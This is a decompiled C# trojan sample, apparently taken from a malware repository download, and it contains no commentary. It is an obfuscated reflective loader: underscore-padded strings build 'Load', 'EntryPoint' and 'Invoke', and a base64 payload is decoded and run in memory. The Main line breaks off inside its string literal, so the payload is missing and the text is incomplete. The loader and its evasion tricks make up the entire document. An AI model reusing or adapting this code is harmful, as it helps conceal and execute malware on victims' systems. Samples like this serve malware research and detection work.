// Decompiled with JetBrains decompiler
// Type: ClassLibrary2.Module1
// Assembly: ClassLibrary2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0D5C022A-109E-4166-A647-8DD78D702EC1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Generic-6a81b967e73aaa45a2743b2f8889d0b0824a5202b73fed98fa576fbaa6f5b9cb.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;

namespace ClassLibrary2
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void Main() => Module1.Run_2((object) Module1.Dec_2("

    public static object Run_1(byte[] Data)
    {
      object obj1 = (object) (Module1.Dec_1("_________________________________________________________________________________________________________L_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________o_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________a_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________d_________________________________________________________________________________________________________"));
      CallType UseCallType1 = CallType.Method;
      object objectValue1 = RuntimeHelpers.GetObjectValue(Versioned.CallByName((object) AppDomain.CurrentDomain, Conversions.ToString(obj1), UseCallType1, (object) Data));
      object obj2 = (object) (Module1.Dec_1("E") + Module1.Dec_1("_________________________________________________________________________________________________________n_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________t_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________r_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________y_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________P_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________o_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________i_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________n_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________t_________________________________________________________________________________________________________"));
      CallType UseCallType2 = CallType.Get;
      object objectValue2 = RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(objectValue1), Conversions.ToString(obj2), UseCallType2));
      object obj3 = (object) (Module1.Dec_1("_________________________________________________________________________________________________________I_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________n_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________v_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________o_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________k_________________________________________________________________________________________________________") + Module1.Dec_1("_________________________________________________________________________________________________________e_________________________________________________________________________________________________________"));
      CallType UseCallType3 = CallType.Method;
      object obj4 = (object) 0;
      object obj5 = (object) new string[0];
      return RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(objectValue2), Conversions.ToString(obj3), UseCallType3, obj4, obj5));
    }

    public static string Dec_1(string Data)
    {
      char[] chArray = new char[1]{ '_' };
      return Data.Trim(chArray);
    }

    public static byte[] Dec_2(string Data) => (byte[]) typeof (Convert).GetMethod(Module1.Dec_1("____________________________________________________________________________________________________________________________________________________________________________________________________FromBase64String____________________________________________________________________________________________________________________________________________________________________________________________________")).Invoke((object) 0, new object[1]
    {
      (object) Data
    });

    public static object Run_2(object Data) => (object) Type.EmptyTypes.GetType().Namespace.TrimStart(Conversions.ToChar(Module1.Run_1((byte[]) Data)));
  }
}
